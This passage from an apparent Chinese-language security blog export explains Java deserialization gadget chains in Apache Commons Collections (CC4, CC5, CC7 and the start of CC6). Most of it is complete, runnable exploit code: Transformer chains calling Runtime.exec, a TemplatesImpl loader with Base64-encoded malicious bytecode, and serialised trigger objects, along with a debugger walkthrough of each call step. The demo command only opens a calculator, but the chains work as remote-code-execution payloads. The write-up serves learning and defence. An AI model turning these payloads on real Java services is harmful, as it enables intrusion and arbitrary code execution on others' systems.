            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };


            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            //TransformingComparator 实例
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);

            //PriorityQueue 实例
            PriorityQueue priorityQueue = new PriorityQueue(2);
            //先设置为正常变量值，后面可以通过setFieldValue修改
            priorityQueue.add(1);
            priorityQueue.add(1);

            //反射设置 Field
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 相比其他CC链
在CommonsCollections4系列中，除4.0版本，其他版本InvokerTransformer类都没有实现Serializable接口 ，导致无法序列化，所以这里就是在CC2的基础上使用InstantiateTransformer替换了InvokerTransformer

## 分析
代码与CC1、CC2、CC3有重合，这里就不画蛇添足了

## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections4 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String fieldName, Object fieldValue) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object,fieldValue);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //TransformingComparator实例，并将InvokerTransformer封装进去
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        //获取PriorityQueue实例
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);

        //PriorityQueue实例的成员变量赋值
        Object[] objects = new Object[]{templates,templates};
        setValue(priorityQueue,"queue",objects);
        setValue(priorityQueue,"comparator",transformingComparator);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(priorityQueue);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
效果:

![](https://s3.hedgedoc.org/demo/uploads/8072c067-f5b1-4039-8cab-ca24c5e287e2.png)

报错，但是不影响我弹计算器

## 学习
https://xz.aliyun.com/t/9409




























]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>6、CC5</title>
    <url>/2023/08/25/6%E3%80%81CC5/</url>
    <content><![CDATA[# CC5
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## 相比其他CC链
其实和CC1-2调用链相似，只不过CC1-2序列化的类是InvocationHandler（AnnotationInvocationHandler），CC5序列化的类是BadAttributeValueExpException，其他的代码都差不多
## CC5 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();

    }

}

```
## 分析
直接从中间开始分析

![](https://s3.hedgedoc.org/demo/uploads/91ce6c1d-6b8c-408c-9305-730cb05602bc.png)

还是用的LazyMap，那么肯定是通过LazyMap.get()方法触发；接着将LazyMap对象给封装到TiedMapEntry对象中，我们跟进到TiedMapEntry的这个构造方法

![](https://s3.hedgedoc.org/demo/uploads/bc4bf361-f296-4fdf-8e9a-9113a01f082c.png)

构造方法有两个形参，一个是Map对象，一个是Object对象，这个构造方法主要是给成员变量赋值，其中第一个形参Map是LazyMap对象，所以这里的成员变量map就是LazyMap对象

![](https://s3.hedgedoc.org/demo/uploads/67b94a76-56af-4e2f-8876-fecb38da196f.png)

而TiedMapEntry类中的getValue()方法调用了map（LazyMap）的get()方法

![](https://s3.hedgedoc.org/demo/uploads/a508c377-92e6-4d41-9412-0a8795ed25c0.png)

且equals()、hashCode、toString()方法调用了getValue()方法，也就是说这三个方法都会触发LazyMap.get()方法造成命令执行

继续看demo

![](https://s3.hedgedoc.org/demo/uploads/466acd03-3985-41bc-a675-b40e867e33ba.png)

TiedMapEntry对象被封装到了BadAttributeValueExpException对象中，并赋值给BadAttributeValueExpException对象中的成员变量var，最后将BadAttributeValueExpException对象序列化

那么说明，触发点在BadAttributeValueExpException对象中的readObject()方法中，我们跟进BadAttributeValueExpException.readObject()方法

![](https://s3.hedgedoc.org/demo/uploads/3d99d71d-4710-4d72-87bc-94b61feb1b4a.png)

上图中，先从序列化BadAttributeValueExpException对象中获取到成员变量var的值，然后赋值给valObj，接下来再调用valObj的toString()方法，但是要进入valObj.toString()这个代码，valObj不能为空且varObj不能是String类的实例对象

![](https://s3.hedgedoc.org/demo/uploads/8224f9b1-e3c7-466d-8369-1eb50e4fd74d.png)

不过demo中，直接将TiedMapEntry对象赋值给了成员变量var，所以反序列化BadAttributeValueExpException对象时候，valObj是一个TiedMapEntry对象（valObj不能为空且varObj不能是String类的实例对象），那么就会调用TiedMapEntry.toString()方法，同时也会调用了LazyMap.get()方法，弹出计算器
## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections5 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        //BadAttributeValueExpException 实例
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //反射设置 val
        Field val = BadAttributeValueExpException.class.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException, tiedMapEntry);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(badAttributeValueExpException);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa1223.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409



































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>8、CC7</title>
    <url>/2023/08/25/8%E3%80%81CC7/</url>
    <content><![CDATA[# CC7
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## CC7 Demo
```java=
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {

    public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException {

        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, "test");
        hashtable.put(lazyMap2, "test");


        //通过反射设置真的 transformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);

        //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=>yy，所以这里要移除
        lazyMap2.remove("yy");

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        oos.flush();
        oos.close();

        //测试反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

}

```

## 分析
CC7和CC5、CC6差不多，，调用命令的部分和CC6一模一样

![](https://s3.hedgedoc.org/demo/uploads/29b5b390-3b1b-4b2a-a266-7f6437214fd4.png)

不同LayzMap对象封装到Hashtable对象中，序列化的对象是Hashtable对象

![](https://s3.hedgedoc.org/demo/uploads/3f84a074-b0fc-422b-9460-f69efbc1e12a.png)

这里直接在demo中readObject处打一个断点进行调试，因为demo中序列化的是一个Hashtable对象，所以调用链从Hashtable.readObject()开始

![](https://s3.hedgedoc.org/demo/uploads/1afc1052-72b0-41c0-bed4-d27f62f850f2.png)
## 调用链
1. Hashtable.readObject()
2. Hashtable.reconstitutionPut()
3. AbstractMapDecorator.equals()
4. AbstractMap.equals()
5. LazyMap.get()

### Hashtable.readObject()
在Hashtable.readObject()打一个断点，然后调试

![](https://s3.hedgedoc.org/demo/uploads/ef37f268-41ef-49fc-86a7-7c14cae2e189.png)

这里elements（对象）有是2，代表有两个元素

这是因为demo中把两个LazyMap对象给封装到了Hashtable对象中

![](https://s3.hedgedoc.org/demo/uploads/1b4c5cc1-eb02-4c56-99d5-51ebc18ef14a.png)

继续向下分析

![](https://s3.hedgedoc.org/demo/uploads/7ed6da7e-f960-402d-85cd-bf33fa8f1db8.png)

首先第一个元素的key是一个LazyMap对象，他的key是yy，这里对应的是lazyMap1，继续调试

![](https://s3.hedgedoc.org/demo/uploads/676bba9d-14cd-4f94-a038-9e2820c7556a.png)

第二个元素的也是一个LazyMap对象，他的key是zZ，这里对应的是lazyMap1

最后都会将key和value传入reconstitutionPut()方法

![](https://s3.hedgedoc.org/demo/uploads/cf44d58d-f6f9-4642-92ad-eff0e2484dd9.png)

### Hashtable.reconstitutionPut()
在Hashtable.reconstitutionPut()打一个断点，然后调试

![](https://s3.hedgedoc.org/demo/uploads/0811e98a-e67b-489e-970b-78de998241ab.png)

首先这里传入的key，是lazyMap1

这里先是计算了key（lazyMap1）的hash为3873，然后计然后计算了hash在tab中的位置

但是tab[index]并没有值，因为此时tab里面没有任何元素，为null

![](https://s3.hedgedoc.org/demo/uploads/f3d885e5-7c64-4ddf-971f-ac5b2eadbbe0.png)

所以e为null，不会进入for循环，而是进入到后面1248行的代码逻辑

![](https://s3.hedgedoc.org/demo/uploads/af61dcfc-8902-4834-8c1e-3d64dba9543a.png)

先把tab[index]（null）赋值给e

然后将计算出来的hash、key和其他的变量value、e给传入到tab[index]进行赋值

我们继续调试

后面再一次进入了reconstitutionPut()方法，此时传入的key是lazyMap2

![](https://s3.hedgedoc.org/demo/uploads/a73959be-d9ab-40c2-8304-d7cc1fe67af6.png)

而key的hash和第一次进入reconstitutionPut()计算的hash一样，都是3873，所以他们在tab中的位置是一样的

又因为第一次进入reconstitutionPut()时候给tab[index]赋值了，所以这次就会进入for循环

![](https://s3.hedgedoc.org/demo/uploads/5a246600-4064-4a7f-b374-c52affd06220.png)

此时e就是tab[index]，tab[index]的key就是lazyMap1

而且这里还将key（LazyMap2）传给了e.key（LazyMap）.equals()

![](https://s3.hedgedoc.org/demo/uploads/255be8a8-d269-4b89-993f-a9caba70b8d1.png)

所以接下来得跟进LazyMap.equals()

### AbstractMapDecorator.equals()
这里有个问题，按道理说在调用链里面，应该是触发LazyMap.equals()，为什么后面的是触发AbstractMapDecorator.equals()方法？

因为AbstractMapDecorator是LazyMap的父类

![](https://s3.hedgedoc.org/demo/uploads/e957ff1d-1938-43d6-9c93-5979ac6788c3.png)

LazyMap既然继承于AbstractMapDecorator，那AbstractMapDecorator的方法和成员变量LazyMap理应也一并继承了的，LazyMap不存在equals()方法，但是他的父类AbstractMapDecorator有，所以就调用AbstractMapDecorator.equals()

我们在AbstractMapDecorator.equals()打个断点，继续调试分析

![](https://s3.hedgedoc.org/demo/uploads/602e2561-d918-4c61-84cb-f09e56e30f95.png)

这里首先判断传入的Object对象object是否是当前对象，如果是，就返回true

但是这里当前对象是lazyMap1，而传入的是lazyMap2，所以就进入129行的代码，调用了map.equals(object)

![](https://s3.hedgedoc.org/demo/uploads/08dc1020-5225-4dbc-9e3a-f62d01e5fb23.png)

此时的成员变量map，是一个HashMap对象

对应的赋值是在demo中将给lazyMap1赋值的时候

![](https://s3.hedgedoc.org/demo/uploads/18e42de7-0dcb-48b2-bc95-94ff69fa0f3d.png)

所以接下来得跟进HashMap.equals()

### AbstractMap.equals()
和LazyMap.equals()的情况一模一样，HahsMap没有equals()方法，所以这里也是调用HashMap父类AbstractMap的equals()方法

![](https://s3.hedgedoc.org/demo/uploads/a6a56858-7cb5-4578-8b5a-32fd09d55d90.png)

在AbstractMap.equals()那里打个断点继续调试

![](https://s3.hedgedoc.org/demo/uploads/1e7e1b7b-fc02-4989-a465-76b741528462.png)

这里equals()传入的Object对象o是lazyMap2

在代码第481行时，将o赋值给Map对象m（对象m就成了LazyMap对象）

在代码第495行时，调用了m.get()方法（相当于调用了LazyMap.get()方法），此时的key是yy

继续跟进LazyMap.get()方法

### LazyMap.get()
在LazyMap.get()打个断点，继续调试

![](https://s3.hedgedoc.org/demo/uploads/a7099be0-e86f-43dc-8d95-1fa1e5b7d0e7.png)

这里先会判断传入的key是否在成员变量map中，此时传入的key是“yy”，成员变量map是“zZ->1”，yy不在map中，所以会进入if语句中，成功进入到157行，成功触发factory.transform(key)，即后续的命令执行链

![](https://s3.hedgedoc.org/demo/uploads/3b039944-4cb0-4605-8a39-231ef1790d04.png)

成功弹出计算器

## 其他代码

### fakeTransformer
![](https://s3.hedgedoc.org/demo/uploads/4a09d3b8-7e53-47d1-8e0b-21f9a98e313a.png)

这里设置fakeTransformer的原因很简单，因为在hashtable.put()方法的时候，会调用LazyMap.get()方法

这里直接在hashtable.put()中打个断点调试

![](https://s3.hedgedoc.org/demo/uploads/113d0f52-d52e-48ba-b2c9-a6a179bed460.png)

这样在没有反序列化的时候，就触发了命令执行，后续反序列化的时候就无法触发命令执行链了，不符合我们的预期，所以得先设置一个空的命令执行链，以免在调用hashtable.put()的时候触发命令执行

当然，在调用完hashtable.put()后，需要将空的Transformer数组对象换成能调用命令的Transformer数组对象

demo中用的是将Transformer数组对象封装进ChainedTransformer对象中的，也就是赋值给成员iTransformers的

![](https://s3.hedgedoc.org/demo/uploads/c135cce7-9626-4ac3-b99c-65bba1fb6442.png)

而成员变量iTransformers是用private修饰的，所以需要用反射修改

![](https://s3.hedgedoc.org/demo/uploads/caf479cb-f6ef-438d-b023-88088cbdd4b3.png)

### lazyMap2.remove("yy"); 
![](https://s3.hedgedoc.org/demo/uploads/08f9940d-bb92-4ae7-badc-0e130485ef0b.png)

为什么要移除lazyMap2中的键对“yy”，因为在调用hashtable.put(lazyMap2, "test");的时候，就会再添加一个yy->yy

![](https://s3.hedgedoc.org/demo/uploads/2b5ed482-619a-43e4-bed6-bac74224fae5.png)

这样会影响AbstractMap.equals()调用链的调用过程，不会进入LazyMap.get()链中

![](https://s3.hedgedoc.org/demo/uploads/1b8fa5ad-aa80-4496-acf9-f0f4eba5adfb.png)

所以需要在demo代码中将“yy->yy”去掉

## 学习
https://xz.aliyun.com/t/9409

https://zhuanlan.zhihu.com/p/647418911

https://cloud.tencent.com/developer/article/1809858









]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>7、CC6</title>
    <url>/2023/08/25/7%E3%80%81CC6/</url>
    <content><![CDATA[# CC6
## 利用版本
jdk8（这里用的jdk8u201） && Commons-Collections 3.1-3.2.1
## CC6 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {

        Transformer[] fakeTransformer = new Transformer[]{};

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        //先设置假的 Transformer 数组，防止生成时执行命令
        Transformer chainedTransformer = new ChainedTransformer(fakeTransformer);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //TiedMapEntry 实例
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");

        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test");


        //通过反射设置真的 ransformer 数组
        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //清空由于 hashMap.put 对 LazyMap 造成的影响
        lazyMap.clear();

        //序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
